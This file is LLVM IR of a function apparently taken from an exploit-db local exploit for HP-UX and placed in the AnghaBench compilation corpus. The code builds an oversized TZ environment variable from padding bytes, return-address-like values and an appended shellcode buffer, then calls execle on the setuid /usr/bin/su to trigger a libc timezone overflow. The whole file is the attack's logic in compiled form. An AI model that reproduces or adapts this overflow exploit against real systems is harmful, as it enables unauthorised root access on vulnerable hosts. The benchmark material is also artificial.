; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_2636.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_2636.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"PATH=\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"MANPATH=\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"TZ=\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [44 x i8] c"[ HP-UX libc timezone environment overflow\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"/usr/bin/su\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"pdk\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca [4 x i8], align 1
  %4 = alloca [4 x i8], align 1
  %5 = alloca [4 x i8], align 1
  %6 = alloca i8*, align 8
  %7 = alloca [3 x i8*], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 283934591, i64* %10, align 1
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %4, i64 0, i64 0
  %12 = bitcast i8* %11 to i64*
  store i64 94142335, i64* %12, align 1
  %13 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 0
  %14 = bitcast i8* %13 to i64*
  store i64 2139030940, i64* %14, align 1
  %15 = call i64 @malloc(i32 126)
  %16 = inttoptr i64 %15 to i8*
  store i8* %16, i8** %6, align 8
  %17 = load i8*, i8** %6, align 8
  %18 = call i32 @memset(i8* %17, i32 0, i32 126)
  %19 = load i8*, i8** %6, align 8
  store i8* %19, i8** %2, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i32 @sprintf(i8* %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %22 = load i8*, i8** %6, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 5
  store i8* %23, i8** %6, align 8
  store i32 0, i32* %8, align 4
  br label %24

24:                                               ; preds = %35, %0
  %25 = load i32, i32* %8, align 4
  %26 = icmp slt i32 %25, 120
  br i1 %26, label %27, label %38

27:                                               ; preds = %24
  %28 = load i32, i32* %8, align 4
  %29 = srem i32 %28, 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %4, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = load i8*, i8** %6, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %6, align 8
  store i8 %32, i8* %33, align 1
  br label %35

35:                                               ; preds = %27
  %36 = load i32, i32* %8, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %8, align 4
  br label %24

38:                                               ; preds = %24
  %39 = load i8*, i8** %2, align 8
  %40 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  store i8* %39, i8** %40, align 16
  %41 = call i64 @malloc(i32 809)
  %42 = inttoptr i64 %41 to i8*
  store i8* %42, i8** %6, align 8
  %43 = load i8*, i8** %6, align 8
  %44 = call i32 @memset(i8* %43, i32 0, i32 809)
  %45 = load i8*, i8** %6, align 8
  store i8* %45, i8** %2, align 8
  %46 = load i8*, i8** %6, align 8
  %47 = call i32 @sprintf(i8* %46, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %48 = load i8*, i8** %6, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 8
  store i8* %49, i8** %6, align 8
  store i32 0, i32* %8, align 4
  br label %50

50:                                               ; preds = %61, %38
  %51 = load i32, i32* %8, align 4
  %52 = icmp slt i32 %51, 800
  br i1 %52, label %53, label %64

53:                                               ; preds = %50
  %54 = load i32, i32* %8, align 4
  %55 = srem i32 %54, 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %4, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %6, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %6, align 8
  store i8 %58, i8* %59, align 1
  br label %61

61:                                               ; preds = %53
  %62 = load i32, i32* %8, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %8, align 4
  br label %50

64:                                               ; preds = %50
  %65 = load i8*, i8** %2, align 8
  %66 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 1
  store i8* %65, i8** %66, align 8
  %67 = call i64 @malloc(i32 3429)
  %68 = inttoptr i64 %67 to i8*
  store i8* %68, i8** %6, align 8
  %69 = load i8*, i8** %6, align 8
  %70 = call i32 @memset(i8* %69, i32 0, i32 3427)
  %71 = load i8*, i8** %6, align 8
  store i8* %71, i8** %2, align 8
  %72 = load i8*, i8** %6, align 8
  %73 = call i32 @sprintf(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %74 = load i8*, i8** %6, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 3
  store i8* %75, i8** %6, align 8
  store i32 0, i32* %8, align 4
  br label %76

76:                                               ; preds = %87, %64
  %77 = load i32, i32* %8, align 4
  %78 = icmp slt i32 %77, 2384
  br i1 %78, label %79, label %90

79:                                               ; preds = %76
  %80 = load i32, i32* %8, align 4
  %81 = srem i32 %80, 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [4 x i8], [4 x i8]* %4, i64 0, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = load i8*, i8** %6, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %6, align 8
  store i8 %84, i8* %85, align 1
  br label %87

87:                                               ; preds = %79
  %88 = load i32, i32* %8, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %8, align 4
  br label %76

90:                                               ; preds = %76
  store i32 0, i32* %8, align 4
  br label %91

91:                                               ; preds = %102, %90
  %92 = load i32, i32* %8, align 4
  %93 = icmp slt i32 %92, 4
  br i1 %93, label %94, label %105

94:                                               ; preds = %91
  %95 = load i32, i32* %8, align 4
  %96 = srem i32 %95, 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = load i8*, i8** %6, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %6, align 8
  store i8 %99, i8* %100, align 1
  br label %102

102:                                              ; preds = %94
  %103 = load i32, i32* %8, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %8, align 4
  br label %91

105:                                              ; preds = %91
  store i32 0, i32* %8, align 4
  br label %106

106:                                              ; preds = %117, %105
  %107 = load i32, i32* %8, align 4
  %108 = icmp slt i32 %107, 1002
  br i1 %108, label %109, label %120

109:                                              ; preds = %106
  %110 = load i32, i32* %8, align 4
  %111 = srem i32 %110, 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 %112
  %114 = load i8, i8* %113, align 1
  %115 = load i8*, i8** %6, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %6, align 8
  store i8 %114, i8* %115, align 1
  br label %117

117:                                              ; preds = %109
  %118 = load i32, i32* %8, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %8, align 4
  br label %106

120:                                              ; preds = %106
  store i32 0, i32* %8, align 4
  br label %121

121:                                              ; preds = %135, %120
  %122 = load i32, i32* %8, align 4
  %123 = load i32*, i32** @shellcode, align 8
  %124 = call i32 @strlen(i32* %123)
  %125 = icmp slt i32 %122, %124
  br i1 %125, label %126, label %138

126:                                              ; preds = %121
  %127 = load i32*, i32** @shellcode, align 8
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = trunc i32 %131 to i8
  %133 = load i8*, i8** %6, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %6, align 8
  store i8 %132, i8* %133, align 1
  br label %135

135:                                              ; preds = %126
  %136 = load i32, i32* %8, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %8, align 4
  br label %121

138:                                              ; preds = %121
  %139 = load i8*, i8** %2, align 8
  %140 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 2
  store i8* %139, i8** %140, align 16
  %141 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 3
  store i8* null, i8** %141, align 8
  %142 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %143 = getelementptr inbounds [3 x i8*], [3 x i8*]* %7, i64 0, i64 0
  %144 = call i32 @execle(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i32 0, i8** %143)
  %145 = load i32, i32* %1, align 4
  ret i32 %145
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
